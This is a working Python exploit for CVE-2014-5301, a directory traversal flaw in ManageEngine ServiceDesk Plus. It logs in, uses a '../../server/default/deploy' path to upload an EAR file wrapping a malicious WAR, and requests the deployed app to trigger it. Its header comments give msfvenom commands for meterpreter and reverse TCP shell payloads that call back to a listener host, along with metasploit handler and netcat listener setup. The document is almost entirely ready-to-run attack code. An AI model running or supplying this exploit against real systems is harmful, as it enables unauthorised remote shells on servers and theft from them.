#!/usr/bin/python3

# This script exploits the directory traversal vulnerability in
# ManageEngine ServiceDesk Plus. It has been tested on version 7.6.0.
# See also https://www.cvedetails.com/cve/CVE-2014-5301/

# Use msfvenom to create a war file with meterpreter payload
# msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.56.108 LPORT=4444 -f war > shell.war
#
# or with a reverse TCP shell
# msfvenom -p java/shell_reverse_tcp LHOST=192.168.56.108 LPORT=4444 -f war > shell.war

# Before executing the script start the meterpreter handler
# meterpreter
#   use multi/handler
#   set payload java/meterpreter/reverse_tcp
#   set LHOST 192.168.56.108
#   run
#
# or start netcat listener on LPORT
# nc -nlvp 4444

# Script usage: ./CVE-2014-5301.py HOST PORT USERNAME PASSWORD WARFILE
# HOST: target host
# PORT: target port
# USERNAME: a valid username for ManageEngine ServiceDesk Plus
# PASSWORD: the password for the user
# WARFILE: a war file containing the mallicious payload

from io import BytesIO
from xml.etree import ElementTree

import base64
import os
import random
import requests
import string
import sys
import time
import zipfile

# Generate a random string of given length
def random_string(length):
    charset = string.ascii_uppercase + string.ascii_lowercase + string.digits
    return ''.join(random.choice(charset) for _ in range(length))

# Extract name from web.xml in the given war file
def get_war_app_base(war_file):
    with zipfile.ZipFile(war_file, "r") as war:
        with war.open("WEB-INF/web.xml") as web_inf:
            xml_root = ElementTree.fromstring(web_inf.read())
            return xml_root.find('servlet').find('servlet-name').text

# Check command line arguments
if (len(sys.argv) - 1) != 5:
    print("Usage: ./CVE-2014-5301.py HOST PORT USERNAME PASSWORD WARFILE")
    exit(1)

# Initialize
host = sys.argv[1]
port = sys.argv[2]
username = sys.argv[3]
password = sys.argv[4]
war_file_name = sys.argv[5]

me_base_url = "http://" + host + ":" + port
s = requests.session()

# Get JSESSIONID which we have to pass during the authentication request
url = me_base_url + "/"
s.get(url)

# Authenticate the user with provided credentials
url = me_base_url + "/j_security_check"
data = dict(j_username=username, j_password=password, logonDomainName=-1)
s.post(url, data=data)

# Upload bogous file - currently not needed
# url = me_base_url + "/common/FileAttachment.jsp"
# multipart_data = [
#     ("module", (None, random_string(4))),
#     (random_string(8), (random_string(8), random_string(32), "application/octet-stream")),
#     ("att_desc", (None, ""))
# ]
# s.post(url, files=multipart_data)

# Create ear file from the given war file
display_name = random_string(32)
ear_app_base = random_string(32)
ear_file_name = ear_app_base + ".ear"
war_app_base = get_war_app_base(war_file_name)

application_xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
application_xml += "<application>"
application_xml += "<display-name>" + display_name + "</display-name>"
application_xml += "<module><web><web-uri>" + war_file_name + "</web-uri>"
application_xml += "<context-root>/" + ear_app_base + "</context-root></web></module>"
application_xml += "</application>"

war_file = open(war_file_name, "rb")
war_file_content = war_file.read()
war_file.close()

in_mem_ear = BytesIO()
with zipfile.ZipFile(in_mem_ear, "w", zipfile.ZIP_STORED) as ear_file:
    ear_file.writestr("META-INF/application.xml", application_xml)
    ear_file.write(war_file_name)

# Upload ear file
url = me_base_url + "/common/FileAttachment.jsp"
multipart_data = [
    ("module", (None, "../../server/default/deploy")),
    (random_string(4), (ear_file_name, in_mem_ear.getvalue(), "application/octet-stream", {"Content-Transfer-Encoding": "binary"})),
    ("att_desc", (None, ""))
]
req = requests.Request("POST", url, files=multipart_data)
prepared_req = s.prepare_request(req)
settings = s.merge_environment_settings(prepared_req.url, {}, None, None, None)
r = s.send(prepared_req, **settings)

# Execute uploaded payload
for i in range(5):
    url = me_base_url + "/" + ear_app_base + "/" +  war_app_base + "/" + random_string(16)
    print("Trying " + url)
    resp = s.get(url)
    if (resp.status_code == 200):
        exit(0)
    else:
        time.sleep(3)